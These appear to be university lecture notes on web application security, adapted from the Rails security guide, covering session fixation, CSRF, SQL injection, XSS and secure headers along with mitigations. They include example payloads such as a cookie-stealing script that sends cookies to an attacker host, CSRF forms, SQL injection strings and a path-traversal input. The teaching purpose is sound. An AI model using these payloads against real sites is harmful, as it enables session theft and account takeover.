# ICCS474
## Internet Programming

### SSL

- Secure Socket Layer
- Well explained here.
    - https://www.digicert.com/ssl.htm

> Based on Rails Security Best Practice
> http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf

### Session Hijacking

- Stealing a user's session id lets an attacker use the web application in the victim's name
    - The session id is a 32 byte long MD5 hash value
    - How to steal?
        - It's normally done by using man-in-the-middle attack.
        - Full access to user's hardware
    - How to protect?
        - SSL 
            - Not 100% safe
            - Still vulnerable to man-in-the-middle attack

### Session Fixation

- Faking user session and make them think that they are using their own account while they are not.

![Image](https://raw.githubusercontent.com/SaKKo/muic-iccs474-2015t2/master/assets/session_fixation.png)

> This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:
> 
> - The attacker creates a valid session id: They load the login page of the web application where they want to fix the session, and take the session id in the cookie from the response (see number 1 and 2 in the image).
> - They maintain the session by accessing the web application periodically in order to keep an expiring session alive.
> - The attacker forces the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: <script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>. Read more about XSS and injection later on.
> - The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.
> - As the new trap session is unused, the web application will require the user to authenticate.
> - From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.

- How to protect?
    - Always reset user's session before login and after logout.
        - `reset_session`
    - Session Expiry
        - Since client can edit their own cookies, we need to store and expire sessions from server side.

### CSRF

![Image](https://raw.githubusercontent.com/SaKKo/muic-iccs474-2015t2/master/assets/csrf.png)

- Cross Site Forgery
    - Basically making request to server without using javascript or minimize using javascript. 
    - Example
        - GET
            - `<img src="http://www.webapp.com/project/1/destroy">`
        - MOUSE OVER Javascript
            - `<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="dosomething()" />`
        - POST, Automatically sent
```        
            <a href="http://www.harmless.com/" onclick="
              var f = document.createElement('form');
              f.style.display = 'none';
              this.parentNode.appendChild(f);
              f.method = 'POST';
              f.action = 'http://www.example.com/account/destroy';
              f.submit();
              return false;">To the harmless survey</a>
```


- How do we protect our server from CSRF?
    - use GET, POST, PATCH, PUT or DELETE appropriately. 
        - Avoid get request that change application state.
    - a security token in non-GET requests will protect your application from CSRF
        - Beware of XSS
        - Include Authenticity Token for form POST.
            - In rails easily done by using, `protect_from_forgery with: :exception`

```
            rescue_from ActionController::InvalidAuthenticityToken do |exception|
              sign_out_user # Example method that will destroy the user cookies
            end
```

>A real-world example is a router reconfiguration by CSRF. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had their credentials stolen.
>Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.



### Redirection
        
- Attacker manipulate the redirect uri to be a phishing website
    - INTENDED
        -  `http://www.example.com/site/redirect?to=www.mywebsite.com`
    - MODIFIED
        -  `http://www.example.com/site/redirect?to=www.attacker.com`
- Avoid allowing user to supply redirect uri

### File Uploads

- Make sure file uploads don't overwrite important files, and process media files asynchronously.
    - EG. `../../../etc/passwd`
- Executable Code in File Uploads
    - Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory.

### Intranet and Admin Security

- The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:

    - It is very important to think about the worst case: What if someone really got hold of your cookies or user credentials. You could introduce roles for the admin interface to limit the possibilities of the attacker. Or how about special login credentials for the admin interface, other than the ones used for the public part of the application. Or a special password for very serious actions?
    - Does the admin really have to access the interface from everywhere in the world? Think about limiting the login to a bunch of source IP addresses. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
    - Put the admin interface to a special sub-domain such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.

### User Management

- Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure.

### Brute-Forcing Accounts

- Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA.
    - A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.
    - Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.
    - However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.
    - In order to mitigate such attacks, display a generic error message on forgot-password pages, too. Moreover, you can require to enter a CAPTCHA after a number of failed logins from a certain IP address. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.

### Logging

- By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can filter certain request parameters from your log files by appending them to config.filter_parameters in the application configuration. These parameters will be marked [FILTERED] in the log.
    - `config.filter_parameters << :password`

### Good Passwords

- Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence.
    - A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the first letters of a sentence that you can easily remember. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.

### Privilege Escalation

- Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it.
    - NORMAL
        - @project = Project.find(params[:id])
    - Better
        - @project = @current_user.projects.find(params[:id])

### Injection

- Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.
- When sanitizing, protecting or verifying something, prefer whitelists over blacklists
    - Use `before_action :method, only: [...]` instead of `before_action :method, except: [...]`. This way you don't forget to turn it off for newly added actions.
    - Whitelist (Allow) `<strong>` instead of removing `<script>` against Cross-Site Scripting (XSS). See below for details.
    - Don't try to correct user input by blacklists:
        -This will make the attack work: `"<sc<script>ript>".gsub("<script>", "")` 
        - But reject malformed input

### SQL Injection

- Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.

    - Example

```
    # Imagine your query looks like this
    Project.where("name = '#{params[:name]}'")
    # Hacker can try to send 
    # params[:name] = "'' OR 1"
    # Then your query will be
    SELECT * FROM projects WHERE name = '' OR 1 --'
```

More Example

```
    User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")  # Expect true

    # hacker can inject name as "'' OR '1'='1'"
    # hacker can inject password as "'' OR '2'>'1'"

    SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1    # will return true
```

- Prevent all these by
    - Model.find(id)
    - Model.find_by_some
    - Model.where("login = ? AND password = ?", entered_user_name, entered_password)
        - Equivalent to -> Model.where(login: entered_user_name, password: entered_password)

### Cross-Site Scripting (XSS)

- cheatsheet http://ha.ckers.org/xss.html
- The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.
    - Normal script
        - `<script>alert('Hello');</script>`
        - `<img src=javascript:alert('Hello')>`
        - `<table background="javascript:alert('Hello')">`
    - Cookie Theft
        - Simple
            - `<script>document.write(document.cookie);</script>`
        - Stealing
            - `<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>`
            - On `www.attacker.com` log `GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2`
    - Things get ugly when you blacklist
        - We mentioned `sanitize` string before.
        - There are other methods such as `strip_tags` `strip_links` which may cause problem.
        - eg
            - `strip_tags("some<<b>script>alert('hello')<</b>/script>")`
            - returned `some<script>alert('hello')</script>` which is a valid script
    - Whitelist sanitize (from rails 2 sanitize() method does a good job)
        - `tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)`
        - `s = sanitize(user_input, tags: tags, attributes: %w(href title))`

### CSS Injection

- CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.
     - `<div style="background:url('javascript:alert(1)')">`


### Command Line Injection

- If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and command. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

### Unsafe Query Generation

When `params` is one of: `[], [nil], [nil, nil, ...]` or `['foo', nil]` it will bypass the test for nil, but `IS NULL` or `IN ('foo', NULL)` where clauses still will be added to the SQL query.


### Default Headers

- `X-Frame-Options 'SAMEORIGIN'` in Rails by default - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
- `X-XSS-Protection '1; mode=block'` in Rails by default - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
    - When this token is present, if a potential XSS Reflection attack is detected, Internet Explorer will prevent rendering of the page. Instead of attempting to sanitize the page to surgically remove the XSS attack, IE will render only “#”.
    - Internet Explorer recognizes a possible cross-site scripting attack. It logs the event and displays an appropriate message to the user. The MSDN article describes how this header works.
    - The token mode=block will prevent browser (IE8+ and Webkit browsers) to render pages (instead of sanitizing) if a potential XSS reflection (= non-persistent) attack is detected.
- `X-Content-Type-Options 'nosniff'` in Rails by default - stops the browser from guessing the MIME type of a file.
- `X-Content-Security-Policy` A powerful mechanism for controlling which sites certain content types can be loaded from
- `Access-Control-Allow-Origin` Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
- `Strict-Transport-Security` Used to control if the browser is allowed to only access a site over a secure connection






